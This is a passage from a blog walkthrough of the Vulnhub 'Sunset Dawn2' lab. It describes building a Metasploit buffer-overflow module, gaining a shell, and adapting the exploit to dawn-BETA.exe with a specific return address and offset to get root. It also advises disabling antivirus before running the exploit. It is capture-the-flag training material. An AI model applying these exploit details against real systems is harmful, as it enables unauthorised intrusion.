<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-12.png" alt="screenshot" /></p>

<p>we need to reload all modules in the metasploit framework, so that we can search and load our new exploit.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">msf6 &gt;</span><span class="w"> </span>reload_all
</pre></td></tr></tbody></table></code></div></div>
<p>You’ll likely see some warnings with this command. Unless the metasploit framework tells you your new modules can not be loaded, you should be ok to continue. And now we can search for our module within the framework, and metasploit should find it and give us the option to run it.
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-13.png" alt="screenshot" />
Excellent, our module is loaded. Configure it appropriately to match our exploitable server<sup id="fnref:footnote4" role="doc-noteref"><a href="#fn:footnote4" class="footnote">4</a></sup>.
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-14.png" alt="screenshot" />
A note before we actually run this exploit. If you’re using AntiVirus software on your machine, you should turn it off at this point. I was just using Windows’ built in <code class="language-plaintext highlighter-rouge">Defender</code> software and the first time I ran this exploit Defender’s realtime scanner caught it and moved my <code class="language-plaintext highlighter-rouge">dawn.exe</code> to a quarantined folder.</p>

<p>Ok, having said that, let’s run it.
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-15.png" alt="screenshot" />
Excellent, it worked and we have shell on the remote system as the use running the dawn.exe program.</p>

<h2 id="attacking-the-server">Attacking the Server</h2>
<p>Now that we know our exploit works against the standalone server we ran on our Windows machine, let’s try it against our VM we downloaded from <code class="language-plaintext highlighter-rouge">Vulnhub</code>. The only thing we really need to change is the IP address. Point that to your dawn2 VM and run the exploit.
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-16.png" alt="screenshot" />
And it works! Great. Now grab that first flag.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-r1.png" alt="screenshot" class="normal" /></p>

<p>The system reports we’re on a Windows 2008 box. Further exploration reveals that’s not the case, we’re actually on Linux. Debian 10 to be exact.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-17.png" alt="screenshot" class="normal" /></p>

<p>The above screenshot shows us as much. Ok so we have a shell on the remote dawn2 server. Our goal is to root this box. We could try to escalate privileges from this point, but there are two things to note. Port 1435 is open and we haven’t really messed with that yet. Exporing that port proves that it’s unstable and prone to crash, much like port 1985 on both our dawn2 server and the dawn.exe binary we developed our exploit with. I’m betting that’s another dawn executable running. What if we change our port to 1435 and run our exploit against that?</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-18.png" alt="screenshot" class="normal" /></p>

<p>Hm. Our exploit ran and completed without error, but no session was created. We’re missing something. Something I didn’t explore yet is the dawn-BETA.exe in the original exploit’s home directory. We didn’t tinker with that at all yet. Let’s do it now, repeating all of the previous steps on this new executable but changing values as appropriate.</p>

<p>Once again running the dawn-BETA.exe and attaching our x32dbg to the process. This time we find that only 100 characters will overflow the server’s registers. Now this is where the attack got really tricky, and I’ll admit I played around with this for quite a long time. In the end, I think it was more a fluke than skill, finding the avenue of attack.</p>

<p>So our msfbinscan that we used earlier didn’t give us any useful address that we could use. I was analyzing the binary with rabin with when I stumbled onto something. Using <code class="language-plaintext highlighter-rouge">rabin2 -s dawn-BETA.exe</code> I saw this:
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-19.png" alt="screenshot" />
Right there, highlighted in red, we see what appears to be a function call. Usually something is being pushed onto the stack when working with functions. Looking at the disassembly in <code class="language-plaintext highlighter-rouge">x32dbg</code> I found this:
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-20.png" alt="screenshot" />
While analysing the executable (<code class="language-plaintext highlighter-rouge">.text</code>) section of the binary, and within the 52501510 mark, we find our ticket. <code class="language-plaintext highlighter-rouge">push ebp; mov ebp, esp; call esp</code> is basically taking the <code class="language-plaintext highlighter-rouge">ebp</code> register, which we can overwrite, and putting that value into <code class="language-plaintext highlighter-rouge">esp</code>. Let’s update our <code class="language-plaintext highlighter-rouge">metasploit</code> template with our new values, <code class="language-plaintext highlighter-rouge">0x52501510</code> for our <code class="language-plaintext highlighter-rouge">Ret</code> value, and <code class="language-plaintext highlighter-rouge">13</code> for our new <code class="language-plaintext highlighter-rouge">Offset</code> value, which we discovered with <code class="language-plaintext highlighter-rouge">pattern_create.rb</code> and <code class="language-plaintext highlighter-rouge">pattern_offset.rb</code> trick. Load that newly modified module into <code class="language-plaintext highlighter-rouge">metasploit</code> and run it against the server.</p>

<p>And there we have it!</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-21.png" alt="screenshot" /></p>

<p>And root’s <code class="language-plaintext highlighter-rouge">proof.txt</code></p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/images/dawn2-22.png" alt="screenshot" class="normal" /></p>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:footnote1" role="doc-endnote">
      <p>Never under any circumstances run any unknown executable on any computers that you care about. <a href="#fnref:footnote1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:footnote2" role="doc-endnote">
      <p>Yes, that’s perl, because I’m a dinosaur. <a href="#fnref:footnote2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:footnote3" role="doc-endnote">
      <p>“A” in hex is 0x41, or, 41 <a href="#fnref:footnote3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:footnote4" role="doc-endnote">
      <p>My ip addresses changed in the middle of this write up. I moved labs. Everything else is the same, however. <a href="#fnref:footnote4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/infosec/'>infosec</a>,
            <a href='/categories/vulnhub/'>vulnhub</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/infosec/"
            class="post-tag no-text-decoration" >infosec</a>
          
          <a href="/tags/vulnhub/"
            class="post-tag no-text-decoration" >vulnhub</a>
          
          <a href="/tags/hacking/"
            class="post-tag no-text-decoration" >hacking</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Vulnhub - Sunset Dawn2 walkthrough - Matt M&url=/posts/vulnhub-dawn2/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Vulnhub - Sunset Dawn2 walkthrough - Matt M&u=/posts/vulnhub-dawn2/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Vulnhub - Sunset Dawn2 walkthrough - Matt M&url=/posts/vulnhub-dawn2/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/infosec/">infosec</a>
      
        
        <a class="post-tag" href="/tags/hacking/">hacking</a>
      
        
        <a class="post-tag" href="/tags/vulnhub/">vulnhub</a>
      
        
        <a class="post-tag" href="/tags/configuration/">configuration</a>
      
        
        <a class="post-tag" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag" href="/tags/security/">security</a>
      
        
        <a class="post-tag" href="/tags/unix/">unix</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/vulnhub-walkthroughs/">
          <div class="card-body">
            <!--
  Date format snippet
-->





<span class="timeago small"
  >

  
  

  
    Mar  1
  

  <i class="unloaded">2021-03-01T10:02:00-06:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub walkthroughs</h3>
            <div class="text-muted small">
              <p>
                





                On the issue of walkthroughs
When I first discovered intentionally vulnerable virtual machines, I got so sucked into (lost even) in the world of ethical hacking. I absolutely loved thrill of quickl...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/vulnhub-dawn3/">
          <div class="card-body">
            <!--
  Date format snippet
-->





<span class="timeago small"
  >

  
  

  
    Mar 10
  

  <i class="unloaded">2021-03-10T13:38:00-06:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Sunset Dawn3 walkthrough</h3>
            <div class="text-muted small">
              <p>
                





                Introduction
Vulnhub dawn2 is listed on Vulnhub’s site as beginner/intermediate. This shares a lot of similarities with Sunset Dawn2, only this is VM is a bit easier to pop. Skills you’ll need are ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/alpine-nftables/">
          <div class="card-body">
            <!--
  Date format snippet
-->





<span class="timeago small"
  >

  
  

  
    Mar  8
  

  <i class="unloaded">2021-03-08T09:57:00-06:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Alpine Linux - Using nftables</h3>
            <div class="text-muted small">
              <p>
                





                Setting up
Install Alpine Linux. Having a port listening (ssh or http for example) will help in testing out your firewall rules.
Next, install nftables with the following command.
1
$ apk add nftab...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/vulnhub-walkthroughs/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Vulnhub walkthroughs</p>
  </a>
  

  
  <a href="/posts/alpine-nftables/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Alpine Linux - Using nftables</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



  <!--
  image lazy load: https://github.com/ApoorvSaxena/lozad.js
-->
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>

<script type="text/javascript">
  const imgs = document.querySelectorAll('.post-content img');
  const observer = lozad(imgs);
  observer.observe();
</script>




        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        ©
        <!-- years range -->
        
        
        
        2021
        <!-- copyright owner -->
        <a href="https://twitter.com/username">your_full_name</a>.
        <!-- copyright statement -->
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">
          Some rights reserved.
        </span>
        
      </p>

    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/infosec/">infosec</a>
      
        
        <a class="post-tag" href="/tags/hacking/">hacking</a>
      
        
        <a class="post-tag" href="/tags/vulnhub/">vulnhub</a>
      
        
        <a class="post-tag" href="/tags/configuration/">configuration</a>
      
        
        <a class="post-tag" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag" href="/tags/security/">security</a>
      
        
        <a class="post-tag" href="/tags/unix/">unix</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

